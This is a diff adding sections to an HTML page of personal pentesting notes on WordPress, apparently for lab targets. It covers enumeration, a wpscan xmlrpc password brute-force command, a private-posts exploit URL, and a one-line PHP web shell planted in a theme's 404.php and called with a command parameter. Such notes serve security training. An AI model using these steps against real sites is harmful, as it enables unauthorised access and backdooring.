@@ -25,20 +25,87 @@
         <div class="notion-body">
             <h2>Enumeration</h2>
             <ul>
-                <p>Global enumeration</p>
-                <pre><code class="language-bash"> wpscan --url giveback.htb -e vp --plugins-detection mixed --api-token D1bt...</code></pre>
-
-                <p>Login location</p>
-                <pre><code class="language-bash"> http://domain.com/wp-admin </code></pre>
-
-                <p>List users which have made a post</p>
-                <pre><code class="language-bash"> http://domain.com/wp-json/wp/v2/users/ </code></pre>
+                <h3>Automated enumeration</h3>
+                <ul>
+                    <pre><code class="language-bash"> wpscan --url giveback.htb -e vp --plugins-detection mixed --api-token D1bt...</code></pre>
+                </ul> 
                 
-                <p>Wordpress Core &gt;5.2.3 permits attacks to list Private posts. <a class="notion-link" href="https://www.exploit-db.com/exploits/47690">Here</a></p>
-                <pre><code class="language-bash"> http://office.paper/?static=1&order=desc </code></pre>
+                <h3>Manual enumeration</h3>
+                <ul>    
+                <p>In order to check if a website is a wordpress we could lookfor the <b>robots.txt</b> file which would look like this</p>
+                <pre><code class="language-bash">User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+Disallow: /wp-content/uploads/wpforms/</code></pre>
+                <p>Another way to check it is by using curl</p>
+                <pre><code class="language-bash">curl -s http://blog.inlanefreight.local | grep WordPress</code></pre>    
+                
+                <h4>Interesting endpoints</h4>
+                <ul>
+                <pre><code class="language-bash">http://domain.com/wp-admin   #Admin login 
+http://domain.com/wp-content
+http://domain.com/wp-content/plugins #Plugins directory
+http://domain.com/wp-content/themes  #Themes directory
+http://domain.com/wp-content/uploads #Uploads directory</code></pre>
+                </ul>   
+                 
+                <h4>Username enumeration</h4>    
+                <ul>
+                    <p>It is possible to enumerate useranmes by perfming login request against <b>/wp-login.php</b> this way in case of a valid useranme but invalid password wordpress will tell for us</p>
+                    <b>Of course this will depend on the version we are testing</b>
+                    <p>Another way it to list users which have made a post</p>
+                    <pre><code class="language-bash"> http://domain.com/wp-json/wp/v2/users/ </code></pre>
+                    <p>Bruteforcing is always there... A good way of performing that is using wpscan as following. This will use the xmlrpc which is faster than the login page</p>
+                    <pre><code class="language-bash">sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://domain.com/</code></pre> 
+                </ul>
+
+                <h4>Checking wordpress content</h4>
+                <ul>
+                    <p>When pentesting it is always recommended to first check the content of the website we are testing. In some cases you may find anything interesting. Here are some examples</p>
+                    <h5>Wordpress Core &gt;5.2.3 permits attacks to list Private posts. <a class="notion-link" href="https://www.exploit-db.com/exploits/47690">Here</a></h5>
+                    <pre><code class="language-bash"> http://office.paper/?static=1&order=desc </code></pre>
+                </ul>        
             </ul>
-            
-            
+                
+                <h3>Identifying vulnerabilities</h3>
+                <ul>
+                    <h4>Themes</h4>
+                    <ul>
+                        <p>An easy way of identifying vulnerabilties is through themes. Once we identifyied the theme name we could search for vulnerabilities related</p>
+                        <pre><code class="language-bash">curl -s http://blog.inlanefreight.local/ | grep themes</code></pre> 
+                    </ul>
+                    <h4>Plugins</h4>
+                    <ul>
+                        <p>The same can be performed with plugins</p>
+                        <pre><code class="language-bash">curl -s http://blog.inlanefreight.local/ | grep plugins</code></pre>
+                        <p>In order to check for the plugin version we could browse the plugin name and luckily we'll find a README.txt file </p>
+                        <pre><code class="language-bash">http://blog.inlanefreight.local/wp-content/plugins/plugin-name/</code></pre> 
+                    </ul>
+                </ul>
+
+                
+                
+               
+            </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Command execution</h3>
+                <ul>
+                    <p>Once you have access to the administration panel of wordpress a good option to acquire command execution is to modify an existing theme and adding some fun stuff. <b>Be intelligent and don't modify the current theme</b>. Here are the steeps to perform it</p>
+                    <ul>
+                        <li>Access the admin panel and then go to the <b>appereance</b>-> <b>Theme Editor</b>  section</li>
+                        <li>In the right side will appear all the themes select one of them which is not using currently (You can check which of them is selectec in the <b>Appereance</b>-> <b>Themes</b> section)</li>
+                        <li>Select a simple page just like <b>404.php</b> and add the following code</li>
+                        <pre><code class="language-bash">system($_GET[0]);</code></pre>
+                        <li>Then search for that page and pass the command as the first parameter</li>
+                        <pre><code class="language-bash">http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id </code></pre>
+                    </ul>
+
+                    <p>You can automate this prcess by using the metasploit module</p>
+                    <pre><code class="language-bash">exploit/unix/webapp/wp_admin_shell_upload  </code></pre>
+                </ul>
+            </ul>
         </div>
     </div>
 
